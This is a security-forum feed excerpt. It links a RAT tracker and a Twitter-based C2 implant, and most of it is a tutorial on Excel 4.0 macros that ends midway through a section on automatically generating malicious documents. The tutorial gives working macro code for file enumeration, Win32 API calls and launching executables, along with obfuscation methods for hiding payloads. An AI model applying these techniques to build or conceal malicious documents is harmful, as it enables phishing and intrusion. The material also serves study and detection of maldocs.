    <img src="https://0x00sec.s3.amazonaws.com/original/2X/1/1eb5abbb66e15d08e55709231200b46227f1d9ff.jpeg" class="thumbnail" width="" height="">

<h3><a href="https://github.com/intezer/MoP/" target="_blank" rel="noopener nofollow ugc">intezer/MoP</a></h3>

<p>MoP - "Master of Puppets" - Advanced malware tracking framework - intezer/MoP</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<aside class="onebox stackexchange">
  <header class="source">
      <a href="https://stackoverflow.com/questions/61412249/protobuf-net-unrecognized-stream-prefix/61425656#61425656" target="_blank" rel="noopener nofollow ugc">stackoverflow.com</a>
  </header>
  <article class="onebox-body">
      <a href="https://stackoverflow.com/users/23354/marc-gravell" target="_blank" rel="noopener nofollow ugc">
    <img alt="Marc Gravell" src="https://0x00sec.s3.amazonaws.com/original/2X/1/162a90f8e3dbf1671665722c6045ddcd1c42e2a5.png" class="thumbnail onebox-avatar" width="" height="">
  </a>
<h4>
  <a href="https://stackoverflow.com/questions/61412249/protobuf-net-unrecognized-stream-prefix/61425656#61425656" target="_blank" rel="noopener nofollow ugc">Protobuf-net unrecognized stream prefix</a>
</h4>

<div class="tags">
  <strong>python, c#, protocol-buffers, reverse-engineering</strong>
</div>

<div class="date">
  
  answered by
  <a href="https://stackoverflow.com/users/23354/marc-gravell" target="_blank" rel="noopener nofollow ugc">
    Marc Gravell
  </a>
  on <a href="https://stackoverflow.com/questions/61412249/protobuf-net-unrecognized-stream-prefix/61425656#61425656" target="_blank" rel="noopener nofollow ugc">12:30PM - 25 Apr 20 UTC</a>
</div>

  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e95f249bbbc14b840d6c8032e500c1f83496ef06.png" class="site-icon" width="" height="">
      <a href="https://developers.google.com/protocol-buffers" target="_blank" rel="noopener nofollow ugc">Google Developers</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/0/0225468a5d62cffe7966eb053415eb3e946fbd7e.png" class="thumbnail" width="" height="">

<h3><a href="https://developers.google.com/protocol-buffers" target="_blank" rel="noopener nofollow ugc">Protocol Buffers &nbsp;|&nbsp; Google Developers</a></h3>

<p>Protocol buffers are a language-neutral, platform-neutral extensible mechanism for serializing structured data.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
      <a href="https://github.com/quasar/Quasar" target="_blank" rel="noopener nofollow ugc">GitHub</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2ee5ea931c62e4d29e99abba9746000a5a5b05da.png" class="thumbnail" width="" height="">

<h3><a href="https://github.com/quasar/Quasar" target="_blank" rel="noopener nofollow ugc">quasar/Quasar</a></h3>

<p>Remote Administration Tool for Windows. Contribute to quasar/Quasar development by creating an account on GitHub.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

            <p><small>8 posts - 5 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/master-of-rats-how-to-create-your-own-tracker/20848">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/master-of-rats-how-to-create-your-own-tracker/20848</link>
          <pubDate>Mon, 27 Apr 2020 15:07:11 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-20848</guid>
          <source url="https://d.clarkee.co.uk/t/master-of-rats-how-to-create-your-own-tracker/20848.rss">Master of RATs - How to create your own Tracker</source>
        </item>
        <item>
          <title>LARRYCHATTER - PoC HAMMERTOSS - C2 over Twitter</title>
          <dc:creator><![CDATA[slaeryan]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>Hey Offsec mates,</p>
<p>So I was reading the report by FireEye on the Russian state-sponsored cyber operator team - APT 29 and their malware named HAMMERTOSS tDiscoverer.<br>
What it did was generate seemingly “random” Twitter handles periodically and use commands embedded in a tweeted image from that handle for C&amp;C.<br>
Basically, their motto is to mimic human behaviour so as not to get caught by next-gen network security solutions.<br>
Naturally, it caught my eye due to the unconventional C2 channel used by them.<br>
I mean sure we have seen social media being used as C2 in real-life by APTs such as the Indian Patchwork team etc but we don’t really see it often do we?</p>
<p>I decided to create a quick prototype in Python 3 demonstrating the implant’s  capabilities and also added some extra features. Now, originally I intended to make a C2 framework much like Empire, Faction, Sliver, Covenant etc as I thought it’d be a cool addition to a Red Team operator’s arsenal but I got caught up in some other work so the project never progressed further and development halted.</p>
<p>Full disclosure: The code is messy as hell since I didn’t get time to clean it up but it works. It’s stupid perhaps but it works as intended as of yet.</p>
<p>I’m posting the link to the Github repository in case someday someone might find it useful and create a production C2 framework based on it.<br>
Here’s the link: <a href="https://github.com/slaeryan/LARRYCHATTER" rel="nofollow noopener">https://github.com/slaeryan/LARRYCHATTER</a></p>
<p>Oh and P.S. - Did you know the cute bird of Twitter is named Larry? Chatter of course means communication. Ergo, I thought it’d be appropriate to name the project LARRYCHATTER.</p>
<p>Hope you guys find it useful, cheers!</p>
            <p><small>4 posts - 2 participants</small></p>
            <p><a href="https://d.clarkee.co.uk/t/larrychatter-poc-hammertoss-c2-over-twitter/20645">Read full topic</a></p>
          ]]></description>
          <link>https://d.clarkee.co.uk/t/larrychatter-poc-hammertoss-c2-over-twitter/20645</link>
          <pubDate>Sun, 19 Apr 2020 16:08:39 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">d.clarkee.co.uk-topic-20645</guid>
          <source url="https://d.clarkee.co.uk/t/larrychatter-poc-hammertoss-c2-over-twitter/20645.rss">LARRYCHATTER - PoC HAMMERTOSS - C2 over Twitter</source>
        </item>
        <item>
          <title>Excel | Primi passi</title>
          <dc:creator><![CDATA[exploit]]></dc:creator>
          <category>Malware</category>
          <description><![CDATA[
            <p>In the name of Allah, the most beneficent, the most merciful.</p>
<hr>
<h1>Introduction</h1>
<p><em>“I believe in the existence within myself of a power.<br>
From this belief derives my will to exert it.”</em></p>
<p>I’ve always considered practice a <em>golden key</em> to further comprehend a given subject.<br>
Experimentation expands theory and stimulates creativity, as there is virtually no limit to what could be learnt or done.</p>
<h2>Excel - Basics</h2>
<p>In Excel, the initial file on which the user operates is called a <em>Workbook</em> that initially is composed of <em>three Worksheets</em> as seen below:</p>
<p><span alt="image" data-base62-sha1="wnyptkYgfnWetONdtWiJhmtMQ4G" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Each <em>single sheet</em> consists of <em>alphabetic columns</em> and <em>numeric rows</em>, with the <em>selected cell</em> name indicated in an <em>Edit control</em> <strong>above</strong> (e.g.: <em>B2</em>):</p>
<p><span alt="image" data-base62-sha1="4wH8Qa3XygwQBrrArlzDxQLBh1n" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
The user has the possibility to automate calculations in a Worksheet by using <em>Formulas</em>. Once defined they can easily applied to other <em>adjacent cells</em> as well:<br>
<span alt="image" data-base62-sha1="bpjsdQ3lJ0NVJGfQV1kqUzF4mB0" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p><span alt="image" data-base62-sha1="51LmBJm9qKZ4CzpzTWvQwuvnbrj" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p><span alt="image" data-base62-sha1="rchnd9QgZVI3v0pm760TwB5gmSQ" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>Furthermore, <em>multiple functions</em> are provided for logical operations such as an <code>IF</code> case:</p>
<p><span alt="image" data-base62-sha1="hqRVKgd4rj3mJHL9CWTANeVLmH5" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
This translates to:</p>
<pre><code class="lang-auto">=IF(OR(A1&lt;A2; FALSE); 1; 0)
</code></pre>
<h2>Macros</h2>
<p><em>Macros</em> are declarations of one to several procedures, which either have a return-value, in which case they are considered a <em>Function</em> or  in case they do not have one they are labeled as a <em>Sub</em>.<br>
Excel also comes with a <em>Visual Basic Editor</em> that is efficient for real-time creation and testing of Macros.<br>
By default it can be invoked using the Hotkey <em>ALT+F11</em> and looks like this:</p>
<p><span alt="image" data-base62-sha1="2YDoN0evf62IdNQMYEbzhcYIU5r" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
In case of us adding macros the file extensions will have to be either <em>XLS</em> or <em>XLSM</em> to support these macros:<br>
<span alt="image" data-base62-sha1="nnLsRMRAvHmBXq3mFH4EUBDL6Px" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
–<br>
<span alt="image" data-base62-sha1="93Ksf3wYhfz0JWIaVPGIaMW4FZB" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
Similarly a new icon already displays mistrust towards XLSM files du to macros being able to cause harm without a user actively knowing…<br>
Additionally, when these file with macros are opened, a <em>security warning</em> is displayed to raise awareness of <em>potential risks</em>, and asks if the user consents to enable the macros.<br>
<span alt="image" data-base62-sha1="a9R3cyuucqTO4T5T2cDttlS1GuB" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
–<br>
<span alt="image" data-base62-sha1="61Txgi2dGuHfPgccENelYxbiOVJ" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
This certainly should not be done unless <em>our document have been thoroughly analysed</em>.</p>
<h3>Macros - XL4 Edition</h3>
<p>XL4 are considered legacy macros that are still supported in newer Excel versions.<br>
Their powerful nature allows them to perform multiple actions.<br>
They can be executed either by:</p>
<ul>
<li>using <em>VBA’s</em> ExecuteExcel4Macro, or<br>
<span alt="image" data-base62-sha1="7rEP1mRwoqATWex5n3WoMY4NaNF" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span>
</li>
<li>inserting <em>a seperate Excel 4.0 module</em>.<br>
<span alt="image" data-base62-sha1="4dF6csRYj1lwk5ble2t2q0WSy6S" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span>  <span alt="image" data-base62-sha1="jMdCJId7YEF7AFnJ5ucQELv0s4C" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span>
</li>
</ul>
<h4>Running and debugging an Excel 4.0 macro:</h4>
<p>In case we have inserted a macro in our Excel sheet like seen below we can execute and debug it a follows.</p>
<ol>
<li>First we select <em>execute</em> from the context menu<br>
<span alt="image" data-base62-sha1="hJVLTFlFYMTga85dxPbo4lq9tKm" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span>
</li>
<li>Then we select which cell (==name) to execute<br>
<span alt="image" data-base62-sha1="aHlqJ3CaNAekyogiwCV7TzZ5pW6" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span>
</li>
<li>Finally we have to confirm out choices and are good to go!<br>
<span alt="image" data-base62-sha1="9MaMKMusc3G0IO7aG2VBHx5kusi" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
In our case a simple message will be displayed when upon completion:<br>
<span alt="image" data-base62-sha1="m2k7YkdYpriNRe8G8pudajyrxU2" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span>
</li>
</ol>
<h4>Macros - Demonstrating advanced funcionality</h4>
<ul>
<li>
<p><strong>Identifying the current runtime environment</strong>:<br>
For this test we need a mix of <code>SET.NAME</code>, <code>GET.WORKSPACE</code> and and <code>IF</code> condition.<br>
The function <code>GET.WORKSPACE</code> requires a <code>Type_num</code> integer, which specifies the information to be retrieved.<br>
<span alt="image" data-base62-sha1="3TrcAOnx3juOPv9t7ugz6ebAD4T" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
<code>SET.NAME</code> assigns its return-value to a variable called <code>ENV</code>, It is then instructed using the <code>IF</code> to <code>QUIT</code> if it cannot not <code>FIND</code> (case-sensitive) <em>Windows</em> in <code>ENV</code>.<br>
Additionally, functions like <code>SEARCH</code>, or <code>GOTO</code> to redirect execution to a specific cell can be used aswell.<br>
This full macro looks like this:</p>
<pre><code class="lang-auto"> =SET.NAME("ENV", GET.WORKSPACE(1))
=IF(FIND("Windows", ENV), ALERT(ENV), QUIT())
=HALT()
</code></pre>
<p><span alt="image" data-base62-sha1="71Ncq0mw4nWUkwuhtfwLOc3EFKp" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
</li>
</ul>
<hr>
<ul>
<li>
<p><strong>Reading one or multiple files:</strong><br>
Even from within Excel we can access files on disks. In this setup we have a folder and two files as follows:<br>
<span alt="image" data-base62-sha1="gDeXq89O43tiUbp7zgsupQA4xo8" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
<span alt="image" data-base62-sha1="8JeK6Xkut5Rajsg08p7N1JRtVmo" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
We can traverse directories with the <code>DIRECTORY</code> function before obtaining a directorys file list with <code>FILES</code>, which returns an array.<br>
In our case this is: <code>{"111.", "222."}</code>.<br>
We can access files with <code>FOPEN</code>, which takes an index from a file list array and a mode:<br>
<span alt="image" data-base62-sha1="pCeHivwhnjA0kGI24mVEDtZoXx6" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
We can continue to read the contents with <code>FREADLN</code> until <em>EOF</em> is hit.<br>
For some entertainment we can utilize the <code>BEEP</code> call, which simply emits a sound <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=9" title=":smile:" class="emoji" alt=":smile:">.</p>
<pre><code class="lang-auto">=BEEP()
=DIRECTORY("C:\000\")
=SET.NAME("FLIST", FILES())
=FOR("IDX", 1, COLUMNS(FLIST))
=SET.NAME("FNUM", FOPEN(INDEX(FLIST, IDX), 2))
=WHILE(NOT(FPOS(FNUM) &gt; FSIZE(FNUM)))
=ALERT("L~: " &amp; FREADLN(FNUM))
=NEXT()
=FCLOSE(FNUM)
=NEXT()
=HALT()
</code></pre>
<p><span alt="image" data-base62-sha1="8u69UzTPdKzH1gHHqzGNg50WJDy" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span>  <span alt="image" data-base62-sha1="fNZSL7X0NoC8nnitQ7ybR8VceHi" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
</li>
</ul>
<hr>
<ul>
<li>
<p><strong>Calling external functions</strong>:<br>
We can also invoke external functionality from the Win API, because why not!<br>
For example we can <code>REGISTER</code> the function <code>user32!SwapMouseButton</code> with <em>“AA”</em> as its <a href="https://support.office.com/en-us/article/using-the-call-and-register-functions-06fa83c1-2869-4a89-b665-7e63d188307f#__toc309221612" rel="nofollow noopener"><em>type_value</em></a>.<br>
It reverses or restores the role of the left and right mouse buttons:</p>
<p><span alt="image" data-base62-sha1="luNMOFiQjRef8I6z1eWXVAtgeFq" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span> || <span alt="image" data-base62-sha1="64fu0plG6n2YiC1N8l9SM6hDaA1" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
We have to use a <code>CALL</code> to invoke the cell which was used to <code>REGISTER</code> the function.<br>
<code>GET.WORKSPACE</code> with argument 44 is able to extract the location of the loaded DLL.<br>
<span alt="image" data-base62-sha1="wm9y1urVNa6YGCDG5fJ49n2Ck7L" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
Putting that all together with the knowledge from the prior examples leaves us with the following macro code:</p>
<pre><code class="lang-auto">=REGISTER("user32", "SwapMouseButton", "AA")
=ALERT("Library at " &amp; GET.WORKSPACE(44), 3)
=CALL(A1, TRUE)
=UNREGISTER(A1)
=HALT()
</code></pre>
<p>When finished it yields:<br>
<span alt="image" data-base62-sha1="nmAZRpvyzGsGosMWAPqSPctB4bG" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
And <em>mouse buttons have been indeed swapped</em>!</p>
</li>
</ul>
<hr>
<ul>
<li>
<strong>Executing binaries on the FS:</strong><br>
So far this was all just for fun and some file system enumeration but binaries can be executed from within excel as well.<br>
For example we can spawn the calculator by calling <code>EXEC</code> with one of the following arguments:<br>
<span alt="image" data-base62-sha1="lW3rtQiiR4zf3zGJ7oApezKXNsW" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><pre><code class="lang-auto">=EXEC("CALC", 1)
=HALT()
</code></pre>
Alternatively, we can also simulate key presses by using <a href="https://docs.microsoft.com/en-us/office/vba/api/excel.application.sendkeys" rel="nofollow noopener">KEYS.SEND</a>.<br>
However, it’ll be slower, since there has to be a small timeout delay of abour 2~4 seconds for some reason before the process can run:<br>
<span alt="image" data-base62-sha1="oNn4F0ySonTnutFREsLMb7DFQIw" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><pre><code class="lang-auto">=EXEC("CMD", 2)
=WAIT(NOW() + "00:00:02")
=SEND.KEYS("CALC~", TRUE)
=HALT()
</code></pre>
As a second example I’ll show that a call to <code>ShellExecuteA</code> is also feasible…<br>
<span alt="image" data-base62-sha1="1kgEieBvococ6NBT3eqokXtqpKt" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
We define the following arguments:
<ul>
<li>hwnd = -1(J(Int)),</li>
<li>lpFile = “CALC”(C(Char *))</li>
<li>nShowCmd = 5(H(UInt16_t))</li>
<li>remaining is to be ignored with 0(J(Int)).*</li>
</ul>
<pre><code class="lang-auto">=CALL("shell32", "ShellExecuteA", "JJJCJJH", -1, 0, "CALC", 0, 0, 5)
=HALT()
</code></pre>
Again, an alternative to that can be using <code>INITIATE</code> that prepares a DDE channel with an arbitrary application, except this method warns the user!<pre><code class="lang-auto">=INITIATE("CALC", 0)
</code></pre>
<span alt="image" data-base62-sha1="zYYhBB0jnORurrCcOftS0yu7bA2" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
–<br>
<span alt="image" data-base62-sha1="t6MO23ygvqDpTFEmCjaUxXAz5IH" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span>
</li>
</ul>
<hr>
<ul>
<li>
<p><strong>Obsfucation</strong>:<br>
A cell’s <code>FORMULA</code> can be overwritten, consequently, the payload can be concealed.<br>
If A1 pre-execution contains:</p>
<pre><code class="lang-auto">=FORMULA("=EXEC(""CALC"")", A2)
</code></pre>
<p>On execution, A2 will be populated with the result, and executed right after.</p>
<pre><code class="lang-auto">=EXEC("CALC")
</code></pre>
<p>Another technique is using <code>EVALUATE</code>:</p>
<pre><code class="lang-auto">=ALERT(EVALUATE(CHAR(61) &amp; CHAR(70) &amp; CHAR(105) &amp; CHAR(108) &amp; CHAR(101) &amp; CHAR(115) &amp; CHAR(40) &amp; CHAR(41)))
</code></pre>
<p>Once we execute this we get the following:<br>
<span alt="image" data-base62-sha1="jyiBsDoXt863Bt0jJD4oG0ATuBt" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
To fine tune this obfuscation technique we can use <a class="mention" href="https://d.clarkee.co.uk/u/emparetiw_aparajdm">@Emparetiw_Aparajdm</a>’s method for <a href="https://0x00sec.org/t/continued-fraction-data-encoding/3108"><em>Continued Fraction Data Encoding</em></a>!<br>
His suggestion is to concatenate ASCII codes in order to form a nominator.<br>
The <em>key denominator</em> is to be randomly generated.<br>
The <em>decimal codes</em> need to be padded(<code>3</code>) to ensure information sufficiency:<br>
<span alt="fract" data-base62-sha1="fnUeqGkVzWucNZ5cwJ87WZTawez" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
Here the <code>x</code> being the result of the devision <code>u/v</code>.<br>
For example by using this method the string <em>“=EX”</em> can be encoded as <em>061069088</em>.<br>
The following PHP script implements this exact behavior:</p>
<pre><code class="lang-php">&lt;?php
$u = 61069088;
$v = 41758269584;
$e = [];

while(($r = $u % $v) != 0)
{
	$a = intval($u / $v);
	$u = $v;
	$v = $r;
	array_push($e, $a);
}

var_dump($e);
?&gt;
</code></pre>
<p>The script yields the following result:<br>
<span alt="image" data-base62-sha1="m0V3Abou5SYC0e4vVGpRNZSQTe7" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
That chain of <code>a0, a1, a2, .., a17</code> can be used to reverse the process, multiplied by <em>v</em> will yield <em>u</em>.<br>
The obtained array is to be reversed(<code>array_reverse</code>) and stored in an Excel row.<br>
In another row, the denominator(aka <em>key</em>) will be stored.<br>
<span alt="image" data-base62-sha1="gmhJeSx3s0r0RIqFTlKzmbNYe8r" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
Reversing it is easily done with the following macro:</p>
<pre><code class="lang-auto">=SET.NAME("P", 0)
=FOR.CELL("N", A1:A18, FALSE)
=SET.NAME("P", (P + N) ^ -1)
=NEXT()
=SET.VALUE(B2, TEXT(CEILING((P ^ -1) * B1, 1), REPT(CHAR(48), 3*3)))
=ALERT(B2)
=FOR("H", 0, 2)
=SET.VALUE(B3, B3 &amp; CHAR(MID(B2, H*3 + 1, 3)))
=NEXT()
=ALERT(B3)
=HALT()
</code></pre>
<p><span alt="image" data-base62-sha1="7OT8zsnUE6DPb1JMGCZNdKrSB5T" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span> <span alt="image" data-base62-sha1="iw3FCo5pEgZbB7qFGvDKdfD3fss" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p><a href="http://www.44lbs.net/ilia/Excel4macro.zip" rel="nofollow noopener">Excel 4.0 Functions</a></p>
</li>
</ul>
<h3>Automatic malicious-document generation</h3>
<p><em>“For the seeker of truth nothing takes precedence over the truth,<br>
and there is no disparagement of the truth,<br>
nor belittling either of him who speaks it or of him who conveys it.”</em></p>
<p>My local test environment had XAMPP already installed, a slight modification of its <em>php.ini</em> allows us to use <em>COM</em> extensions:<br>
<span alt="image" data-base62-sha1="zotTIsO6oU4YUGacv1lttgcyWD3" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
Additionally, us allowing  <a href="https://support.microsoft.com/en-us/help/282830/programmatic-access-to-office-vba-project-is-denied" rel="nofollow noopener">VBProject modification programmatically</a> is also required.<br>
<span alt="image" data-base62-sha1="82yKzZ2QAw3qWHpBbJR0UzopVRo" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
Now, pretty much everything can be done with the <a href="https://docs.microsoft.com/en-us/visualstudio/vsto/excel-object-model-overview?view=vs-2019" rel="nofollow noopener">Excel object model</a>…<br>
From spawning <code>EXCEL.EXE</code> to creating an entire document that fits our needs!<br>
I’ll be using  <strong>OleView .NET</strong> to explore registered <em>COM objects</em>.<br>
It makes our life a lot easier!<br>
We can start by doing:<br>
<span alt="image" data-base62-sha1="6im6nfCEOOyr6j7Zm5o3TWqbdNT" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span> || <span alt="image" data-base62-sha1="npVj1eWQ3t7pfjZD7K90y9XLYlp" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
<em>Members</em> of a COM object can be identified by fetching the <em>Typelib</em>.<br>
For that purpose, PHP provides a function called <code>com_print_typeinfo</code>.<br>
<span alt="image" data-base62-sha1="sioRfJSEOX9Dad2d0FxpBgoOQR4" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
We can use it as follows:</p>
<pre><code class="lang-php">$XL = new COM('Excel.Application') or die(0);
com_print_typeinfo($XL);
</code></pre>
<p>The result is a whole page of all the Elements of our XL object.<br>
All these properties can be used to tweak the nature of the document that we’re about to create<br>
We’ll start by looking at three important ones of different nature.</p>
<p><span alt="image" data-base62-sha1="kQVE2iefA6krhReAq3kmF62u0x6" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
The <a href="https://docs.microsoft.com/en-us/office/vba/api/excel.application.visible" rel="nofollow noopener">first property</a> allows to get or set the state of the window visibility.<br>
The second is a collection of all open <a href="https://docs.microsoft.com/en-us/office/vba/api/excel.workbooks" rel="nofollow noopener">Workbooks</a>.<br>
The third is a method, and it simply <em>terminates the process</em>.<br>
Putting that knowledge to use in our PHP script:</p>
<pre><code class="lang-php">$XL-&gt;Visible = TRUE;
$WB = $XL-&gt;Workbooks;
com_print_typeinfo($WB);
Sleep(60);
$XL-&gt;Quit();
</code></pre>
<p>When executed Excel becomes visible in the taskbar, which is essential for debugging.<br>
<span alt="image" data-base62-sha1="xlGScW048Gxyi2MDZaGCdRP41pi" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
However we’re just greeted with the following Excel window…<br>
This does not seem quite useful for now.<br>
<span alt="image" data-base62-sha1="wWqpbKeUykvB4Gqr50ymWPOo7pE" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
This beehavior occurs, because initially the Workbooks count is 0, hence the Excel window is empty.<br>
<span alt="image" data-base62-sha1="2E6u4O33PHZT9KnqqTuhX48WCJh" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<pre><code class="lang-auto">printf("Count: %d", $XL-&gt;Workbooks-&gt;Count);
$WB = $XL-&gt;Workbooks-&gt;Add();
</code></pre>
<p><span alt="image" data-base62-sha1="qkPrqL9uPrD94u113xVzZOzOkjf" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
To add one, we must use <code>Workbooks.Add()</code>, the returned object is the new Workbook.<br>
<span alt="image" data-base62-sha1="hucwtOB7G8XGITYnKjtU8zeKv2Z" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span><br>
The workbook by default holds <code>$XL-&gt;SheetsInNewWorkbook</code>(3) worksheets.<br>
This corresponds to the usual <code>Sheet1, Sheet2, Sheet3</code><br>
The amount of workbooks is stored in an object called <em>Worksheets</em>…<br>
